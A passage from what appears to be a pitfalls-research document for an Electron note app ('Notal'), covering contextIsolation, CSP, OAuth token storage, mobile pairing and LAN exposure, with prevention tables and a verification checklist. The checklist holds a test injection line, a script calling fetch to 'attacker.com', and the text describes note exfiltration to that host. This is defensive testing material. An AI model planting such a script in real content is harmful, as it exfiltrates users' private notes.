Adding Calendar requires renderer→main messages (e.g., "start OAuth flow", "create event"). Developer exposes a wide `contextBridge.exposeInMainWorld('api', { ...everythingWithRawIpcRenderer... })` API to make it easy. Or, worse, flips `contextIsolation: false` "just during development". Ships with it off. A malicious Markdown note with an embedded `<script>` now has direct access to Node's `fs` module → exfiltrates the entire KB.

**Why it hits Notal specifically:**
Notal renders user-authored markdown in the note view. AI-generated wiki content is also rendered. Both surfaces could inject hostile HTML if sanitization ever slips. contextIsolation is the defense-in-depth that prevents injection → RCE.

**Prevention:**
- **contextIsolation: true, nodeIntegration: false, sandbox: true** — non-negotiable, asserted in boot-time check that throws if any of the three is wrong
- Preload surface for v0.3.1 is the minimum required: e.g., `api.calendar.startOAuth()`, `api.calendar.confirmReminder(noteId, eventDetails)`, `api.graph.getConfig()`, `api.graph.setConfig(cfg)`, `api.mobile.getPairedDevices()`, `api.mobile.revokeDevice(id)`. Each is a named function with a typed schema.
- No raw `ipcRenderer` exposed. No `sendSync`. No dynamic channel names.
- CSP meta tag on renderer HTML includes `script-src 'self'` (no `'unsafe-inline'`, no `'unsafe-eval'`)
- Automated test: boot the app, assert `window.require === undefined`, `window.process === undefined`, `window.api` has exactly the expected methods

---

### Pitfall D4: CSP doesn't cover new Google API / mobile-pair endpoints

**Severity:** HIGH
**Phase:** Cross-cutting (Calendar + Mobile)

**What happens:**
Current renderer CSP has `connect-src 'self'`. Adding Google Calendar: developer loosens to `connect-src * https:` "temporarily" to get the OAuth flow working. Ships with it. Now the renderer can connect to any HTTPS host — a malicious embed in a KB page can exfiltrate notes to `attacker.com`. Notal's local-first promise is violated.

**Why it hits Notal specifically:**
The whole point of Notal's architecture is that notes stay local except for explicit LLM/Calendar calls. CSP is the technical enforcement of that promise. Blanket CSP widening un-enforces it.

**Prevention:**
- **Enumerate allowed hosts explicitly**: `connect-src 'self' https://www.googleapis.com https://accounts.google.com https://api.anthropic.com https://api.openai.com`
- **Mobile endpoints don't go through renderer CSP** — they're main-process only, so renderer CSP stays tight
- Add a CSP unit test: load the app with a known-bad URL injection; assert `connect-src` blocks it
- Any PR that modifies CSP in `main.ts` or the renderer HTML requires explicit reviewer sign-off (PR template checkbox)

---

### Pitfall D5: Secrets-in-settings-UI visible over screen-share

**Severity:** MEDIUM
**Phase:** Cross-cutting

**What happens:**
Settings panel shows the Google refresh token (or part of it) as a field value "so the user can debug". User screen-shares during a call. Token leaked. Same mistake: pairing QR code shown in a persistent settings tab rather than a short-lived modal.

**Why it hits Notal specifically:**
Notal users often share their screens — it's a dev/entrepreneur demographic. Settings UIs are opened during "let me show you how I set this up" moments.

**Prevention:**
- Settings panel never shows raw tokens — only "Connected: user@gmail.com, expires Dec 12" or "Not connected"
- Pairing QR codes are **modal-only**, auto-dismiss after 90s TTL, can't be reopened without generating a new code
- Any widget that displays token material includes a "hidden by default, click to reveal, 10-second auto-rehide" pattern (à la GitHub token views)

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Hardcode Google OAuth client_id in source | OAuth "just works" in dev | Recompile + re-release to rotate; leaked if repo goes private→public | Never in shipped code; fine in a dev-mode `.env.local` |
| Single static Bearer token for all mobile devices | One pairing flow to build | Can't revoke one device without breaking all; lost phone = reset everything | Never past v0.3.1 ship |
| Slider values stored as absolutes (not multipliers of adaptive defaults) | Simple persistence schema | Breaks silently as graph grows; user can't tell why | Only in an internal prototype; migrate before ship |
| PWA-only mobile (no native) | No App Store review, faster iteration | iOS storage eviction, weak background sync, reduced user trust | As an initial public beta *with* clear UX warnings about iOS limits |
| `connect-src 'self' https:` blanket CSP | Saves 15 minutes of host enumeration | Violates local-first promise, bypass-able exfiltration | Never in shipped code |
| Phrase detection via always-on LLM call | Easiest to build, highest quality detection | Doubles AI cost per note; user-visible on bill | Acceptable *only* if guarded by regex pre-filter |
| Mobile app uses the user's frontier LLM key directly | "Mobile works offline from desktop" | App Store privacy labels harder; key exposure risk on stolen phone | Only if mobile is explicitly "capture + offline AI" variant; not in v0.3.1 |

---

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| Google OAuth 2.0 (desktop) | Use "Web application" client type, stash client_secret in app | Use "Desktop app" client type with PKCE, no secret |
| Google Calendar API | Poll for event state | Set `extendedProperties.private.notal_note_id` at creation; read-by-property, don't poll |
| Google API quota | Assume the 1M req/day default is yours forever | Monitor quota dashboard; back-off exponentially on 403 `rateLimitExceeded`; cache event lookups |
| Electron + keytar | Ship keytar (native module, painful to bundle cross-arch) | Use `Electron.safeStorage` (built-in, DPAPI-backed on Windows) |
| Electron + OAuth redirect | Redirect to `file://` or custom protocol | Loopback HTTP on `127.0.0.1:<random>` spun up just for the round-trip |
| D3 force simulation in React | `simulation.restart()` on every slider change | Throttled parameter updates + `alphaTarget(0.1)` during drag, `alphaTarget(0)` on release |
| D3 + React reconciliation | Let React rerender the SVG on every tick | D3 mutates SVG directly; React owns the container, not the graph nodes |
| better-sqlite3 + Fastify | Open a second DB handle in the Fastify plugin | Inject the main-process singleton handle; one handle per process, always |
| mDNS / Bonjour for desktop discovery | Advertise every boot without auth | Advertise only when mobile feature is enabled; include a per-install random service name |
| TLS on LAN for local-only apps | Use `http://` "because it's the home network" | Self-signed cert, pinned by mobile during pairing; connection refused on fingerprint mismatch |
| PWA on iOS | Assume IndexedDB is durable | Document the 7-day eviction, nudge users to open weekly, acknowledge sync delivery explicitly |
| App Store privacy labels | "No data collected" as a blanket claim | Enumerate: user notes sent to user's own desktop (not developer), LLM calls with user's key (third-party, not developer) |

---

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Slider drag restarts force sim each tick | Graph drag feels jerky; Windows "Not Responding" title | Throttle to 50ms, alphaTarget pattern, worker-thread sim | ~300 nodes on a mid-tier laptop; earlier with background CPU load |
| Reminder detection LLM call per note | Monthly API cost scales linearly with note volume | Regex pre-filter + piggyback on existing pipeline call | As soon as user exceeds ~50 notes/day |
| Mobile PWA cold start loads the full KB | App takes 5+ seconds to show the capture input | Split bundle: capture UI loads first (≤50KB), KB browse is a separate route loaded on demand | Any network slower than LTE; always-annoying on 3G |
| Calendar orphan reconciliation scan fetches every event | Daily job takes 30+ seconds, Google API quota bites | Use `extendedProperties.private.notal_note_id` as a filter in the list call | Calendar with 500+ events total |
| Graph stores slider values unthrottled to SQLite on every drag tick | Disk I/O spikes during graph interaction | Debounce persistence to once per 500ms *after* drag ends | Every interaction; cumulative wear on laggy disks |
| Mobile outbox grows unbounded when desktop is offline for weeks | Phone storage fills; app slows | Cap outbox size, oldest-first eviction with user-visible warning at 80% | >1000 queued notes |

---

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Shipping Google client_secret in Electron bundle | OAuth client suspension; policy violation | Desktop-app client type + PKCE, no secret |
| Custom-protocol OAuth redirect (`notal://`) | LAN/system-local app hijacks auth code | Loopback HTTP on random 127.0.0.1 port |
| Refresh tokens in plaintext `config.json` | Any process-as-user reads; backup sync leaks | `Electron.safeStorage` / OS keychain |
| MCP server bound to 0.0.0.0 without mTLS | LAN-wide RCE on the knowledge base | Keep bind to 127.0.0.1; separate authenticated mobile endpoint, or mTLS with pairing-issued client certs |
| Static Bearer token shared between MCP agents and mobile | Single revocation event breaks everything | Per-device tokens with scopes and independent revocation |
| Plaintext HTTP on LAN for mobile sync | Packet-sniff reveals notes + tokens | TLS with pinned self-signed cert from pairing |
| CSP widened to `connect-src *` for Google APIs | Exfiltration via malicious markdown/AI content | Enumerate hosts: googleapis.com, accounts.google.com, LLM providers |
| Pairing QR with embedded static token | Shoulder-surf = persistent access | Short-TTL (90s) pairing session + ephemeral nonce + public-key exchange |
| Biometric not required on mobile app launch | Stolen phone = KB access | iOS Keychain `AccessibleWhenUnlockedThisDeviceOnly` + Face/Touch ID gate |
| contextIsolation disabled "just for dev" | Ships with it off → XSS becomes RCE | Boot-time assertion + CI test; contextIsolation: true, sandbox: true, nodeIntegration: false |
| Error messages leak token fragments to logs | Logs in crash reports contain credential material | Structured logging with explicit field redaction; token fields never serialized |

---

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Unilateral calendar event creation | Trust collapse on first false positive | Always-confirm two-stage flow, off by default |
| Silent Calendar auth expiry | User misses real reminders, blames the app | Health indicator + per-note "reconnect" chip when a reminder couldn't be created |
| Slider changes persist across sessions without visible reset | "My graph is broken" with no recovery path | Always-visible Reset, double-click thumb to reset one slider, Ctrl+Z undo |
| Mobile note shows "sent" but desktop hasn't received | Apparent data loss; user rewrites note → duplicates | Explicit delivery states; outbox persists until desktop ACK |
| No indication of mobile-desktop version skew | Mysterious feature failures after update | Version handshake + clear incompatibility message |
| Graph slider panel keeps adding widgets | Panel dominates UI, obscures the graph | Collapse panel to an icon by default; 5-slider cap |
| OAuth flow opens a browser but no indication of what to do next | Users get confused, close the window mid-flow | Desktop shows "Waiting for Google authorization…" modal with a Cancel button |
| Pairing code TTL expires mid-scan | User has to restart pairing, rescans, frustrated | Show a visible countdown; auto-refresh code when 10s remain if still on pair screen |
| No "revoke paired device" UI | Lost-phone panic has no solution | First-class "Paired Devices" settings list with Revoke per row |

---

## "Looks Done But Isn't" Checklist

- [ ] **Google OAuth flow:** Often missing — verify PKCE is actually used (inspect the auth URL for `code_challenge`), verify no client_secret in the bundle (`asar extract && grep -r client_secret`), verify redirect is loopback-random-port (not `notal://`, not a fixed port)
- [ ] **Refresh token storage:** Often missing — verify tokens live in safeStorage not config.json (`cat %APPDATA%/Notal/config.json | grep -i token` → empty)
- [ ] **Reminder suggestion UI:** Often missing — verify no event creation happens without an explicit user click recorded in the preceding 5 seconds (add a telemetry assertion in dev builds)
- [ ] **Timezone handling:** Often missing — test with the OS clock set to America/Los_Angeles vs Asia/Kolkata (half-hour offset), parse "tomorrow 3pm", assert the resulting Google event shows correctly in Google Calendar web UI in both zones
- [ ] **Note-deletion cascade:** Often missing — create a note → AI creates event → delete note → confirm event is removed from Google Calendar (not just from SQLite)
- [ ] **Calendar auth-expired surfacing:** Often missing — manually revoke access from myaccount.google.com, attempt a new reminder; verify the health indicator and per-note badge appear
- [ ] **Graph slider performance:** Often missing — load a 500-node fixture wiki, drag each slider full-range, p95 frame time ≤50ms
- [ ] **Graph reset:** Often missing — set all sliders to extremes, verify Reset to Defaults returns to the adaptive baseline and the graph re-fits to viewport
- [ ] **Graph a11y:** Often missing — axe-core clean; keyboard-only user can adjust every slider; screen reader announces values
- [ ] **Mobile pairing code expiry:** Often missing — generate pairing code, wait 91 seconds, attempt pair → must fail clearly
- [ ] **Mobile TLS pinning:** Often missing — after pairing, change the desktop cert, attempt reconnect → mobile refuses with a clear "server identity changed" message
- [ ] **Mobile outbox durability:** Often missing — capture 5 notes offline, kill the mobile app, reopen → notes are still in outbox
- [ ] **Mobile revoke:** Often missing — revoke paired device from desktop; next mobile request gets 401; mobile shows "connection lost, please re-pair"
- [ ] **Version handshake:** Often missing — spin up `desktop v0.3.1 + mobile v0.4.0-prerelease` and confirm the clear error message appears instead of silent failure
- [ ] **CSP enforcement:** Often missing — inject a `<script>fetch('https://attacker.com')</script>` into a markdown note in dev, verify CSP blocks it in devtools console
- [ ] **contextIsolation:** Often missing — in the renderer devtools, run `window.require` and `window.process` → both must be `undefined`
- [ ] **MCP server bind address:** Often missing — `netstat -an | findstr 7723` (Windows) → must show `127.0.0.1:7723` not `0.0.0.0:7723`

---

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Google client_secret leaked in a shipped build | HIGH | Rotate client in Google Cloud Console (breaks old installers) → issue patch release using Desktop-app client + PKCE → communicate widely |
| Refresh tokens found in plaintext config on users' disks | HIGH | Migration on next launch: detect tokens in config.json, move to safeStorage, zero out the config field; notify user via in-app banner recommending they revoke+reissue via Google |
| Unilateral calendar events created against user expectation | HIGH (trust) | Emergency patch: feature-flag off Calendar writes; provide a "delete all Notal-created events" one-click (scoped via `extendedProperties.private.notal_created=true`) |
| Graph slider values bricked user's layout | LOW | Ship a "Reset to Defaults" button + auto-detect heuristic (bounding box 2x viewport) that offers a one-click reset toast |
| Mobile paired to wrong desktop / unknown desktop | MEDIUM | On desktop: "Paired Devices" list with Revoke; on mobile: Settings → "Forget this Notal desktop" clears local token and cert pin |
| MCP server accidentally exposed to LAN | HIGH | Immediate: patch to force `127.0.0.1`, force-restart with migration. Longer: rotate all per-device mobile tokens, require re-pair |
| Mobile notes lost due to iOS PWA eviction | HIGH (can't undo data loss) | Add a "Pending Notes" recovery view in the PWA that surfaces any outbox entries not yet acknowledged, prompt user to open weekly |
| Desktop-mobile protocol skew | LOW | Version handshake + clear error → user updates one side |

---

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| A1 Client_secret leak | Calendar (OAuth setup, first task) | `asar extract` grep returns zero hits |
| A2 Custom-protocol hijack | Calendar | Loopback-only redirect; automated test asserts bind to 127.0.0.1 and non-deterministic port |
| A3 Plaintext refresh token | Calendar | Boot-time scan of config.json for Google token prefixes returns empty |
| A4 Unilateral event creation | Calendar | UAT: write 20 edge-case "joke" reminders; zero events created without explicit click |
| A5 Timezone drift | Calendar | Test matrix across 4 IANA zones including half/three-quarter hour offsets |
| A6 LLM-per-note cost spike | Calendar | 50-note corpus test: ≤6 LLM calls for the 5-true-positive set |
| A7 Note-deletion cascade | Calendar | UAT: delete note → Google event removed within 10s |
| A8 Silent auth expiry | Calendar | Manual revocation test → health indicator + in-note badge both appear |
| B1 Slider restart freeze | Graph | 500-node benchmark; p95 frame time ≤50ms during drag |
| B2 Stale slider defaults | Graph | Grow fixture from 20 → 400 nodes; default multiplier UI stays sensible |
| B3 No recovery UI | Graph | UAT script: extreme sliders → recover in ≤10s without external help |
| B4 Accessibility | Graph | axe-core clean; keyboard UAT |
| B5 Scope creep | Graph (planning gate) | Slider count exactly 5 at phase exit |
| B6 Hard-coded graph | Graph (pre-refactor) | Refactor PR ships with zero pixel diff |
| C1 Bind to 0.0.0.0 | Mobile (Foundation) | `netstat` check: 127.0.0.1:7723 only; mobile uses a separate authenticated endpoint |
| C2 Shared bearer token | Mobile (Foundation) | `paired_devices` table enforces unique token_hash; revoke-one does not break others (test) |
| C3 WAL concurrency | Mobile (Data layer) | 10-client concurrent write test: zero SQLITE_BUSY, zero data loss |
| C4 Pairing UX/security | Mobile (Onboarding) | 90s TTL test; post-expiry pair attempt fails |
| C5 Plaintext LAN transport | Mobile (Transport) | Fingerprint-mismatch test: tamper with desktop cert → mobile refuses |
| C6 Outbox limbo | Mobile (Sync) | Offline-capture 5 notes, kill+reopen app, notes persist; desktop-wake grace banner shows |
| C7 iOS PWA eviction | Mobile (Platform choice) | 7-day iOS test documented; UX copy set accordingly |
| C8 App Store privacy labels | Mobile (Submission) | Labels match actual data flow; reviewer note drafted |
| C9 Version skew | Mobile (Protocol) | Handshake test with simulated old-desktop/new-mobile |
| C10 Lost phone | Mobile (Threat model) | Revoke-from-desktop test; biometric unlock required on launch |
| D1 Half-done themes | Cross-cutting (scoping) | Binary phase gates; Calendar-first ship priority documented |
| D2 Context-switching cost | Cross-cutting (ordering) | Serial phase sequencing in roadmap |
| D3 Preload/contextIsolation | Cross-cutting (every IPC change) | Boot-time assertion + CI test |
| D4 CSP widening | Cross-cutting (Calendar + Mobile) | Enumerated host list in CSP; unit test for blocked external URL |
| D5 Token-visible-on-screenshare | Cross-cutting (UI review) | Settings UI review checklist: no raw tokens, QR codes are modal-only |

---

## Sources

- Google OAuth 2.0 for Installed Applications (RFC 7636 PKCE pattern) — https://developers.google.com/identity/protocols/oauth2/native-app — HIGH confidence
- Google Calendar API — extendedProperties for private metadata — HIGH confidence
- Electron Security Checklist (contextIsolation, nodeIntegration, sandbox) — https://www.electronjs.org/docs/latest/tutorial/security — HIGH confidence
- Electron safeStorage (DPAPI on Windows, Keychain on macOS) — HIGH confidence
- OWASP Mobile Top 10 (M2 Insecure Data Storage, M3 Insecure Communication) — HIGH confidence
- better-sqlite3 WAL documentation and single-handle guidance — HIGH confidence
- d3-force performance patterns (alphaTarget during drag, worker threads) — HIGH confidence
- Apple App Store Privacy Nutrition Labels requirements — HIGH confidence
- Safari PWA 7-day storage eviction (WebKit ITP) — HIGH confidence (documented WebKit behavior)
- Notal-specific predictions (architecture inference from milestone context) — MEDIUM confidence, requires validation during phase planning

---
*Pitfalls research for: Notal v0.3.1 — Reminders, Graph Control, Mobile*
*Researched: 2026-04-19*
